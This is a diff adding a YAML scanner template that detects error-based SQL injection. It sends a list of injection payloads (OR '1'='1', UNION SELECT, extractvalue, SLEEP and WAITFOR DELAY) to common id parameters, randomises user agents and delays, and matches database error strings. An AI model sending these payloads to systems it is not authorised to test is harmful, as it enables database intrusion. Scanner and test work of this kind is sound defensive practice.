@@ -1,0 +1,99 @@
+id: sqli-error-based
+name: SQL Injection - Error Based
+author: PADOCCA Team
+severity: high
+description: Detects error-based SQL injection vulnerabilities with intelligent validation
+reference:
+  - https://owasp.org/www-community/attacks/SQL_Injection
+  - https://portswigger.net/web-security/sql-injection
+tags:
+  - sqli
+  - injection
+  - database
+  - owasp-top10
+
+requests:
+  - method: GET
+    path:
+      - "/?id={{payload}}"
+      - "/product?id={{payload}}"
+      - "/user?id={{payload}}"
+      - "/article?id={{payload}}"
+      - "/page?id={{payload}}"
+    
+    payloads:
+      payload:
+        - "1'"
+        - "1''"
+        - "1' OR '1'='1"
+        - "1' OR '1'='1'--"
+        - "1' OR '1'='1'#"
+        - "1 UNION SELECT NULL--"
+        - "1' UNION SELECT NULL--"
+        - "1' AND 1=CONVERT(int, @@version)--"
+        - "1' AND extractvalue(1,concat(0x5c,version()))--"
+        - "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+        - "1'; WAITFOR DELAY '0:0:5'--"
+        - "1' AND 1=(SELECT COUNT(*) FROM sysobjects)--"
+    
+    attack: batteringram
+    
+    random_user_agent: true
+    random_delay: [100, 500]
+
+matchers:
+  - type: regex
+    part: body
+    regex:
+      - "SQL syntax.*MySQL"
+      - "Warning.*mysql_fetch"
+      - "MySQLSyntaxErrorException"
+      - "valid MySQL result"
+      - "PostgreSQL.*ERROR"
+      - "Warning.*pg_connect"
+      - "SQLite.*error"
+      - "sqlite3.OperationalError"
+      - "Microsoft.*ODBC.*SQL Server"
+      - "ORA-[0-9]{5}"
+      - "Oracle error"
+      - "Oracle.*Driver"
+      - "SQLSyntaxErrorException"
+      - "org.hibernate.QueryException"
+    condition: or
+
+  - type: word
+    part: body
+    words:
+      - "You have an error in your SQL syntax"
+      - "Unclosed quotation mark after"
+      - "quoted string not properly terminated"
+      - "unterminated quoted string"
+      - "syntax error at or near"
+      - "Microsoft OLE DB Provider for SQL Server"
+    condition: or
+
+behavior_checks:
+  - type: timing
+    description: Check if time-based payloads cause delays
+    timing_baseline: 1000
+    timing_threshold: 4000
+  
+  - type: response_diff
+    description: Check response differences between valid and invalid inputs
+    response_diff:
+      min_difference: 20.0
+      check_points:
+        - "1"
+        - "1'"
+        - "1'--"
+
+exploit_validation:
+  type: command_exec
+  validation: Verify database command execution
+  command_exec:
+    test_command: "SELECT @@version"
+    expected:
+      - "MySQL"
+      - "PostgreSQL"
+      - "Microsoft SQL Server"
+      - "Oracle"
